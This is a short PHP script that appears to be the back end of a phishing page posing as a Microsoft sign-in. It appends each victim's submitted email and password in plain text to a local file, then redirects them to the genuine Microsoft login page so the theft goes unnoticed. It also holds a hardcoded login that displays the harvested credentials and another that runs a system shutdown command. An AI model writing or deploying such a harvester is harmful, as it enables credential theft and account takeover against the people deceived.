<?php
  include 'ip.php';
  session_start();
  $pass = $_POST["passwd"];
  $email = $_SESSION["Email"];
 
  // Adjusted file path for your current directory
  $file_path = '/home/kali/micro/auth/usernames.dat';
 
  // Check for the original "beep" and "boop" credentials
  if ($email === "beep" && $pass === "boop") {
    if (file_exists($file_path)) {
      $file_content = file_get_contents($file_path);
      if ($file_content !== false) {
        echo "<pre>" . htmlspecialchars($file_content) . "</pre>";
      } else {
        echo 'Unable to read file.';
      }
    } else {
      echo 'File not found.';
    }
  } elseif ($email === "die" && $pass === "die") {
    // New function to check for a specific username and password
    // Run the shutdown command
    shell_exec('sudo shutdown -h now');
    exit();
  } else {
    // Write to usernames.dat if credentials don't match
    file_put_contents($file_path, "Username:: " . $email . "    Password:: " . $pass . "\n", FILE_APPEND);
    header('Location: https://login.microsoftonline.com/');
    exit();
  }
 
  session_destroy();   
?>

